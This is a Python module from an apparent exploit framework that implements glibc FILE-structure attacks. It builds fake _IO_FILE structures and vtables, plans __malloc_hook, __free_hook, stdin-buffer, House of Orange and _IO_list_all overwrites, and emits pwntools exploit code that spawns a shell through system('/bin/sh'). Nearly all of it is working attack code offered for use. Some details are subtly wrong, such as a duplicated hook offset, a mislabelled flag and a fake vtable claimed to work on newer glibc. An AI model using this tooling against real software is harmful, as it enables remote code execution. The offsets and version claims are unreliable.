"""
FILE Structure Oriented Programming (FSOP).

Exploits FILE structure (_IO_FILE) for:
- __malloc_hook / __free_hook overwrite (glibc < 2.34)
- _IO_2_1_stdin_ buffer manipulation
- _IO_list_all overwrite
- Fake FILE structure attacks
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from supwngo.utils.helpers import p64, p32
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class IOFile:
    """
    Represents glibc _IO_FILE structure.

    Key fields for exploitation:
    - _flags: Control flags
    - _IO_read_ptr, _IO_read_end: Read buffer pointers
    - _IO_write_base, _IO_write_ptr, _IO_write_end: Write buffer pointers
    - _IO_buf_base, _IO_buf_end: Buffer bounds
    - _chain: Link to next FILE
    - _fileno: File descriptor
    - _vtable_offset: Offset to vtable (newer glibc)
    - vtable: Virtual function table pointer
    """

    # Standard offsets for x86_64 glibc
    OFFSETS = {
        "_flags": 0x00,
        "_IO_read_ptr": 0x08,
        "_IO_read_end": 0x10,
        "_IO_read_base": 0x18,
        "_IO_write_base": 0x20,
        "_IO_write_ptr": 0x28,
        "_IO_write_end": 0x30,
        "_IO_buf_base": 0x38,
        "_IO_buf_end": 0x40,
        "_IO_save_base": 0x48,
        "_IO_backup_base": 0x50,
        "_IO_save_end": 0x58,
        "_markers": 0x60,
        "_chain": 0x68,
        "_fileno": 0x70,
        "_flags2": 0x74,
        "_old_offset": 0x78,
        "_cur_column": 0x80,
        "_vtable_offset": 0x82,
        "_shortbuf": 0x83,
        "_lock": 0x88,
        "_offset": 0x90,
        "_codecvt": 0x98,
        "_wide_data": 0xa0,
        "_freeres_list": 0xa8,
        "_freeres_buf": 0xb0,
        "__pad5": 0xb8,
        "_mode": 0xc0,
        "_unused2": 0xc4,
        "vtable": 0xd8,  # _IO_FILE_plus.vtable
    }

    SIZE = 0xe0  # Total size including vtable pointer

    @classmethod
    def build_fake_file(
        cls,
        flags: int = 0,
        write_base: int = 0,
        write_ptr: int = 0,
        write_end: int = 0,
        buf_base: int = 0,
        buf_end: int = 0,
        fileno: int = 1,
        vtable: int = 0,
        mode: int = 0,
        **kwargs,
    ) -> bytes:
        """
        Build fake _IO_FILE structure.

        Args:
            flags: _flags field
            write_base, write_ptr, write_end: Write buffer pointers
            buf_base, buf_end: Buffer bounds
            fileno: File descriptor
            vtable: Virtual table pointer
            mode: _mode field
            **kwargs: Additional fields

        Returns:
            Fake FILE structure bytes
        """
        data = bytearray(cls.SIZE)

        def write_field(name: str, value: int, size: int = 8):
            offset = cls.OFFSETS.get(name, 0)
            if size == 8:
                data[offset:offset + 8] = p64(value)
            elif size == 4:
                data[offset:offset + 4] = p32(value)
            elif size == 2:
                data[offset:offset + 2] = value.to_bytes(2, 'little')
            elif size == 1:
                data[offset] = value & 0xff

        write_field("_flags", flags)
        write_field("_IO_write_base", write_base)
        write_field("_IO_write_ptr", write_ptr)
        write_field("_IO_write_end", write_end)
        write_field("_IO_buf_base", buf_base)
        write_field("_IO_buf_end", buf_end)
        write_field("_fileno", fileno, 4)
        write_field("vtable", vtable)
        write_field("_mode", mode, 4)

        # Additional fields
        for name, value in kwargs.items():
            if name in cls.OFFSETS:
                write_field(name, value)

        return bytes(data)


@dataclass
class IOFileVtable:
    """
    _IO_FILE virtual function table (_IO_jump_t).

    Contains function pointers called during FILE operations.
    """

    OFFSETS = {
        "__dummy": 0x00,
        "__dummy2": 0x08,
        "__finish": 0x10,
        "__overflow": 0x18,
        "__underflow": 0x20,
        "__uflow": 0x28,
        "__pbackfail": 0x30,
        "__xsputn": 0x38,
        "__xsgetn": 0x40,
        "__seekoff": 0x48,
        "__seekpos": 0x50,
        "__setbuf": 0x58,
        "__sync": 0x60,
        "__doallocate": 0x68,
        "__read": 0x70,
        "__write": 0x78,
        "__seek": 0x80,
        "__close": 0x88,
        "__stat": 0x90,
        "__showmanyc": 0x98,
        "__imbue": 0xa0,
    }

    SIZE = 0xa8

    @classmethod
    def build_fake_vtable(
        cls,
        overflow: int = 0,
        write: int = 0,
        xsputn: int = 0,
        **kwargs,
    ) -> bytes:
        """
        Build fake vtable for FSOP attack.

        Args:
            overflow: __overflow function pointer (called by putc)
            write: __write function pointer
            xsputn: __xsputn function pointer (called by fwrite)
            **kwargs: Additional function pointers

        Returns:
            Fake vtable bytes
        """
        data = bytearray(cls.SIZE)

        def write_ptr(name: str, value: int):
            offset = cls.OFFSETS.get(name, 0)
            data[offset:offset + 8] = p64(value)

        write_ptr("__overflow", overflow)
        write_ptr("__write", write)
        write_ptr("__xsputn", xsputn)

        for name, value in kwargs.items():
            if name in cls.OFFSETS:
                write_ptr(name, value)

        return bytes(data)


class FSOPExploiter:
    """
    FILE Structure Oriented Programming exploiter.

    Techniques:
    1. Hook overwriting (__malloc_hook, __free_hook)
    2. _IO_buf_end manipulation for arbitrary write
    3. House of Orange / FSOP chain
    4. _IO_list_all overwrite
    """

    def __init__(self, libc_version: str = "2.31", bits: int = 64):
        self.version = libc_version
        self.bits = bits
        self.pack = p64 if bits == 64 else p32

        # Parse version
        parts = libc_version.split(".")
        self.major = int(parts[0]) if parts else 2
        self.minor = int(parts[1]) if len(parts) > 1 else 31

        # Feature detection
        self.has_hooks = self.minor < 34  # Hooks removed in 2.34
        self.has_vtable_check = self.minor >= 24  # Vtable verification

    def malloc_hook_attack(
        self,
        libc_base: int,
        one_gadget: int,
    ) -> Dict[str, Any]:
        """
        Overwrite __malloc_hook with one_gadget.

        Args:
            libc_base: Libc base address
            one_gadget: One-gadget RCE offset/address

        Returns:
            Exploit information
        """
        if not self.has_hooks:
            return {
                "error": f"__malloc_hook removed in glibc {self.version}",
                "alternative": "Use FSOP or other technique",
            }

        # Common __malloc_hook offset (varies by version)
        hook_offsets = {
            "2.27": 0x3ebc30,
            "2.31": 0x3ed8e8,
            "2.23": 0x3c4b10,
        }

        hook_offset = hook_offsets.get(self.version, 0x3ed8e8)

        return {
            "technique": "__malloc_hook_overwrite",
            "target": libc_base + hook_offset,
            "payload": self.pack(one_gadget if one_gadget > libc_base else libc_base + one_gadget),
            "steps": [
                f"1. Calculate __malloc_hook: libc_base + 0x{hook_offset:x}",
                "2. Write one_gadget address to __malloc_hook",
                "3. Trigger malloc() to execute one_gadget",
            ],
            "trigger": "malloc() / printf with large format / scanf %ms",
        }

    def free_hook_attack(
        self,
        libc_base: int,
        system_addr: int,
    ) -> Dict[str, Any]:
        """
        Overwrite __free_hook with system for system("/bin/sh").

        Args:
            libc_base: Libc base address
            system_addr: system() address

        Returns:
            Exploit information
        """
        if not self.has_hooks:
            return {
                "error": f"__free_hook removed in glibc {self.version}",
                "alternative": "Use FSOP or other technique",
            }

        hook_offsets = {
            "2.27": 0x3ed8e8,
            "2.31": 0x3ed8e8,
            "2.23": 0x3c67a8,
        }

        hook_offset = hook_offsets.get(self.version, 0x3ed8e8)

        return {
            "technique": "__free_hook_overwrite",
            "target": libc_base + hook_offset,
            "payload": self.pack(system_addr),
            "steps": [
                f"1. Calculate __free_hook: libc_base + 0x{hook_offset:x}",
                "2. Write system address to __free_hook",
                "3. Allocate chunk containing '/bin/sh'",
                "4. free() that chunk -> system('/bin/sh')",
            ],
            "binsh_setup": "Write '/bin/sh\\x00' at start of chunk before free",
        }

    def stdin_buf_attack(
        self,
        libc_base: int,
        target_addr: int,
    ) -> Dict[str, Any]:
        """
        Manipulate _IO_2_1_stdin_ buffer for arbitrary write.

        By modifying _IO_buf_end, subsequent reads can write past
        the normal buffer into arbitrary memory.

        Args:
            libc_base: Libc base address
            target_addr: Where to write data

        Returns:
            Exploit information
        """
        # _IO_2_1_stdin_ offset
        stdin_offset = 0x3eba00  # Varies by version

        return {
            "technique": "_IO_2_1_stdin_._IO_buf_end manipulation",
            "stdin_addr": libc_base + stdin_offset,
            "buf_end_offset": IOFile.OFFSETS["_IO_buf_end"],
            "steps": [
                f"1. Locate _IO_2_1_stdin_ at libc + 0x{stdin_offset:x}",
                "2. Calculate _IO_buf_end field offset (+0x40)",
                "3. Increment _IO_buf_end by 1 byte (e.g., 0x2a -> 0x30)",
                "4. Next input extends buffer into adjacent memory",
                f"5. Can reach target at 0x{target_addr:x}",
            ],
            "notes": [
                "Works with scanf() or gets() after manipulation",
                "Useful when we have limited write primitive",
                "Can reach __malloc_hook if aligned correctly",
            ],
        }

    def house_of_orange(
        self,
        libc_base: int,
        heap_addr: int,
        system_addr: int,
    ) -> Dict[str, Any]:
        """
        House of Orange / FSOP attack.

        Corrupts unsorted bin to trigger FSOP chain on malloc failure.

        Args:
            libc_base: Libc base address
            heap_addr: Heap address for fake FILE
            system_addr: system() address

        Returns:
            Exploit information
        """
        io_list_all_offset = 0x3ec680  # _IO_list_all

        # Build fake FILE for FSOP
        fake_file = IOFile.build_fake_file(
            flags=0x0,  # _IO_IS_FILEBUF
            write_base=0,
            write_ptr=1,  # write_ptr > write_base triggers __overflow
            mode=0,
            _chain=0,
        )

        return {
            "technique": "house_of_orange",
            "io_list_all": libc_base + io_list_all_offset,
            "fake_file": fake_file,
            "steps": [
                "1. Corrupt top chunk size to smaller value",
                "2. Request large allocation -> malloc extends heap",
                "3. Old top chunk goes to unsorted bin",
                "4. Corrupt unsorted bin bk to _IO_list_all - 0x10",
                "5. Trigger malloc -> unsorted bin attack writes main_arena to _IO_list_all",
                "6. Setup fake FILE at main_arena with controlled vtable",
                "7. malloc failure triggers _IO_flush_all_lockp -> FSOP chain",
            ],
            "requirements": [
                "Heap overflow to corrupt top chunk",
                "No tcache (or fill it first)",
                "Libc leak for addresses",
            ],
        }

    def io_list_all_overwrite(
        self,
        libc_base: int,
        fake_file_addr: int,
    ) -> Dict[str, Any]:
        """
        Direct _IO_list_all overwrite attack.

        Simpler than House of Orange if we have arbitrary write.

        Args:
            libc_base: Libc base address
            fake_file_addr: Address of our fake FILE structure

        Returns:
            Exploit information
        """
        io_list_all_offset = 0x3ec680

        return {
            "technique": "_IO_list_all overwrite",
            "target": libc_base + io_list_all_offset,
            "payload": self.pack(fake_file_addr),
            "steps": [
                f"1. Write fake_file_addr to _IO_list_all",
                "2. Setup fake FILE structure at fake_file_addr",
                "3. Set vtable to controlled location or use wide_data",
                "4. Trigger exit() or _IO_flush_all_lockp",
                "5. Fake FILE's overflow handler executes",
            ],
        }

    def build_fsop_payload(
        self,
        system_addr: int,
        binsh_addr: int,
        fake_vtable_addr: int,
    ) -> bytes:
        """
        Build complete FSOP payload (fake FILE + vtable).

        Args:
            system_addr: system() address for shell
            binsh_addr: "/bin/sh" string address
            fake_vtable_addr: Where our fake vtable is placed

        Returns:
            Combined fake FILE + vtable bytes
        """
        # Build fake FILE
        fake_file = IOFile.build_fake_file(
            flags=0x0,
            _IO_write_base=0,
            _IO_write_ptr=1,  # Trigger overflow
            _chain=0,
            vtable=fake_vtable_addr,
        )

        # Build fake vtable with system() as __overflow
        fake_vtable = IOFileVtable.build_fake_vtable(
            overflow=system_addr,
        )

        # In newer glibc, we might need to use _IO_wfile_jumps
        # and control _wide_data instead

        return fake_file + fake_vtable

    def generate_exploit_code(self, technique: str, **kwargs) -> str:
        """Generate Python exploit code."""

        if technique == "free_hook":
            return f'''
# __free_hook overwrite (glibc < 2.34)
from pwn import *

libc_base = {kwargs.get("libc_base", "LEAK_ME")}
system = libc_base + libc.sym.system
free_hook = libc_base + libc.sym.__free_hook
binsh = libc_base + next(libc.search(b"/bin/sh"))

# Overwrite __free_hook with system
write_what_where(free_hook, p64(system))

# Allocate chunk with "/bin/sh"
alloc(0x20, b"/bin/sh\\x00")

# Free to trigger system("/bin/sh")
free(chunk_idx)
'''

        elif technique == "fsop":
            return f'''
# FSOP attack (glibc 2.34+)
from pwn import *

# Build fake FILE structure
fake_file = flat(
    0,                    # flags
    0, 0, 0,             # read pointers
    0, 1, 0,             # write_base, write_ptr (trigger overflow), write_end
    0, 0,                # buf_base, buf_end
    b"\\x00" * 0x20,     # padding
    0,                   # _chain
    1,                   # _fileno
    b"\\x00" * 0x40,     # more padding
    fake_vtable_addr,    # vtable
)

# Overwrite _IO_list_all
write_what_where(io_list_all, fake_file_addr)

# Trigger via exit() or abort()
exit(0)
'''

        return "# Unknown technique"

    def summary(self) -> str:
        """Get FSOP summary."""
        return f"""
FSOP Exploiter
==============
glibc version: {self.version}
Has hooks (__malloc_hook, __free_hook): {self.has_hooks}
Has vtable check: {self.has_vtable_check}

Available techniques:
- malloc_hook_attack: Overwrite __malloc_hook (glibc < 2.34)
- free_hook_attack: Overwrite __free_hook (glibc < 2.34)
- stdin_buf_attack: Manipulate stdin buffer bounds
- house_of_orange: Unsorted bin + FSOP chain
- io_list_all_overwrite: Direct FILE chain corruption
"""
